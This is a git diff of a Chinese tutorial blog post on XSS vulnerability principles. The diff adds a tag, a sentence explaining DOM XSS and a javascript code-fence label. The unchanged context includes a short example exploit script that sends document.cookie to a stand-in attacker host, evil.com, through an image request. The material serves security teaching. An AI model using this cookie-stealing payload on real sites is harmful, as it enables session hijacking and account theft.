@@ -1,7 +1,8 @@
 ---
 title: XSS学习系列Chapter 2：漏洞原理
 date: 2019-03-11 09:42:09
-tags:
+tags: 
+	- XSS
 categories: WEB漏洞学习
 ---
 
@@ -25,6 +26,8 @@ categories: WEB漏洞学习
 
 **3.DOM XSS**
 
+> DOM XSS是由于前端的JS操作DOM时存在漏洞。
+>
 > 与前两种的主要区别在于，DOM XSS是不与服务端交互的，触发XSS靠的只是客户端DOM解析，DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码并不在返回页面源码中回显。
 
 ### 0x02 XSS特点
@@ -56,7 +59,7 @@ categories: WEB漏洞学习
 
 **2.漏洞利用脚本：**
 
-```
+```javascript
 var img = document.createElement('img'); 
 img.src='http://www.evil.com/no.php?'+escape(document.cookie);
 document.body.appendChild(img);
